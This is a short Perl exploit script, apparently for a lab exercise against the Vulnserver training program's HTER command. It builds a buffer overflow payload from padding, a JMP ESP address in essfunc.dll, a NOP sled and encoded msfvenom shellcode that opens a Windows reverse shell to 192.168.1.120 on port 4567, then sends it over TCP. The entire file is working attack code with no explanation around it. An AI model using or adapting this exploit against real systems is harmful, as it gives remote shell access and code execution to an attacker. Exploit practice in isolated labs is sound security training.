#!/usr/bin/perl

use strict;
use warnings;

use IO::Socket::INET;

my $host = "192.168.1.121";
my $port = 9999;

my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                 PeerPort => $port,
                                 Proto    => 'tcp');

my $payload = "A" x 2041;
# JMP ESP in essfunc.dll at 0x625011af
$payload .= "AF115062";

# a few nops
$payload .= "90" x 10;

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.120 LPORT=4567 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00" -f c | grep -v unsigned | tr -d '";\\x\n' | tr '[:lower:]' '[:upper:]'
$payload .= "DBDED97424F45E29C9BA31D115ABB15283EEFC3156130367C2F75E7B0C75A083CD1A2866FC1A4EE3AFAA04A143404851D72445565082B35961BF80F8E1C2D4DAD80C291B1C70C049F5FE777D724A44F6C85ACCEB995DFDBA9207DD3D763C54259B792EDE6FF5B136BEF61E770E055EB0A9F615C8C98B2D0FB357BB8B13131B77A5F0FAFCA9BD895AAE405DD1CAC960355B8946910749E680ED3C17D24DE0BD9960F5CFC0EC3AE2FAEC547589DEFB2D055373E8D294AE4C4C6B51AD45A805FDFD192696FDA6F339AD08ACF91DE91C9277E64382782CEC2983A7D3068A4FBC548CBEEBD06AAA03B52543BD9CBDF2420BB835C8B83DFB39B42D6CCA830F3BD53927A744A6B7AE7471E0E74B88641AF5229AE7630C1E3C50939FB1ECB78F0FECF3FBDFBBAD55A6151C0F70C9F6C70521C991096CBF7DBBD98682748E0EFB682EF0D6284E13F244E78A97E46A2D422A93AE66D360AE03D62D68F8AA3E1DFE193E34";

$payload .= "C" x (3000 - length($payload));


$sock->send("HTER " . $payload . "\n");
close $sock;
